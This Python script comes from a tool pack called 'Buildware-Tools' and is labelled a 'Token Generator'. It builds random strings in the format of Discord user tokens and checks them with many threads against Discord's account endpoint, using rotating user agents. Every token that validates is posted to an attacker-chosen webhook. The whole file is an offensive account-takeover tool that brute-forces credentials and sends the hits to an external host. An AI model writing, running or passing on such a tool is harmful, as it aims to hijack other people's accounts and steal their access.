# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Core.Utils import *
from Core.Config import *

try:
    import json
    import random
    import requests
    import string
    import threading
except Exception as e:
    MissingModule(e)

Title("Token Generator")

Scroll(GradientBanner(discord_banner))

try:
    webhook = ChoiceWebhook()

    try:
        threads_number = int(input(f"{INPUT} Threads {red}->{reset} ").strip())
        if threads_number < 1:
            threads_number = 1
        if threads_number > 50:
            threads_number = 50
    except:
        ErrorNumber()

    print(f"{LOADING} Generating..", reset)

    found_count = 0
    lock        = threading.Lock()

    def SendWebhook(token):
        try:
            payload = {
                "embeds"    : [{
                    "title"      : "Token Found!",
                    "description": f"**Token:**\n```{token}```",
                    "color"      : color_embed,
                    "footer"     : {"text": username_webhook, "icon_url": avatar_webhook},
                }],
                "username"  : username_webhook,
                "avatar_url": avatar_webhook,
            }
            requests.post(
                webhook,
                json=payload,
                headers={"Content-Type": "application/json", "User-Agent": RandomUserAgents()},
                timeout=10
            )
        except Exception:
            pass

    def GenerateToken():
        token_chars = string.ascii_letters + string.digits + "-_"
        first_part  = "".join(random.choices(token_chars, k=random.choice([24, 26])))
        second_part = "".join(random.choices(token_chars, k=6))
        third_part  = "".join(random.choices(token_chars, k=38))
        return f"{first_part}.{second_part}.{third_part}"

    def TokenCheck():
        global found_count
        token = GenerateToken()
        try:
            response = requests.get(
                "https://discord.com/api/v9/users/@me",
                headers={"Authorization": token, "User-Agent": RandomUserAgents()},
                timeout=10
            )
            if response.status_code == 200:
                with lock:
                    found_count += 1
                print(f"{SUCCESS} Valid  | Token:{red} {token}", reset)
                threading.Thread(target=SendWebhook, args=(token,), daemon=True).start()
            elif response.status_code == 429:
                pass
            else:
                print(f"{ERROR} Invalid | Token:{red} {token}", reset)
        except Exception:
            pass

    try:
        while True:
            threads = [threading.Thread(target=TokenCheck, daemon=True) for _ in range(threads_number)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
    except KeyboardInterrupt:
        print(f"\n{SUCCESS} Found:{red} {found_count}{white} valid token(s)!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)